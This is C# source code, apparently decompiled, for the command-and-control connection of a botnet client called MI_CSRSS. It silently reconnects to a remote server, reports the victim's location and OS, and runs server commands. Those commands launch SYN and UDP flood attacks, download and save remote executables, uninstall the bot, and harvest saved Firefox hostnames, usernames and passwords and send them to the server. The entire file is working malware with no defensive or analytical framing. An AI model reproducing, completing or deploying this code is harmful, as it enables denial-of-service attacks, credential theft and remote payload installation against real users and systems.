using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using MI_CSRSS.floods;

namespace MI_CSRSS;

internal class Connection
{
	private static TcpClient _tcp;

	private static StreamWriter _sw;

	private static StreamReader _sr;

	private static string _host;

	private static int _port;

	private static Thread handlerThread;

	public static bool BusyWithCmds = false;

	public static void StartConn(string host, int port)
	{
		_host = host;
		_port = port;
		new Thread(TCPConnthread).Start();
	}

	private static void TCPConnthread()
	{
		while (true)
		{
			try
			{
				_tcp = new TcpClient();
				_tcp.Connect(_host, _port);
				_sw = new StreamWriter(_tcp.GetStream());
				_sr = new StreamReader(_tcp.GetStream());
				_sw.AutoFlush = true;
				handlerThread = new Thread(MiscHandling);
				handlerThread.Start();
				GetAuth2Client();
				break;
			}
			catch
			{
			}
		}
	}

	private static void GetAuth2Client()
	{
		SendConnByte("AUTH~" + Misc.GetUserLocation() + "~" + Misc.GetOperSys() + "~(v1.5)" + Config.id);
	}

	private static void MiscHandling()
	{
		try
		{
			while (true)
			{
				string text = _sr.ReadLine();
				string[] array = text.Split(new char[1] { '~' });
				try
				{
					if (array[0] == "SYN")
					{
						TCP.tcpfloodstart(array[1], int.Parse(array[2]), int.Parse(array[4]), int.Parse(array[3]));
					}
					else if (array[0] == "UDP")
					{
						UDP.udpfloodstart(array[1], int.Parse(array[2]), int.Parse(array[3]), int.Parse(array[4]), int.Parse(array[5]));
					}
					else if (array[0] == "STOP")
					{
						if (UDP.IsOn)
						{
							UDP.stopudpfloody();
						}
						if (TCP.IsOnline)
						{
							TCP.tcpfloodstop();
						}
					}
					else if (array[0] == "DWN")
					{
						Download.wgetfile(array[1], new Random().Next(100000, 999999) + ".exe");
					}
					else if (array[0] == "REM")
					{
						SendConnByte("QUIT");
						Misc.UninstallBots();
					}
					else if (array[0] == "UDP")
					{
						UDP.udpfloodstart(array[1], int.Parse(array[2]), int.Parse(array[3]), int.Parse(array[4]), int.Parse(array[5]));
					}
					else if (array[0] == "GETFF")
					{
						ff.ffEntry[] array2 = ff.grabthacookies();
						for (int i = 0; i < array2.Length; i++)
						{
							ff.ffEntry ffEntry = array2[i];
							SendConnByte("FF~" + ffEntry.host + "~" + ffEntry.user + "~" + ffEntry.pass);
						}
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
			StartConn(_host, _port);
		}
	}

	public static void SendConnByte(string txt)
	{
		try
		{
			_sw.WriteLine(txt);
		}
		catch
		{
			try
			{
				_tcp.Close();
			}
			catch
			{
			}
		}
	}
}
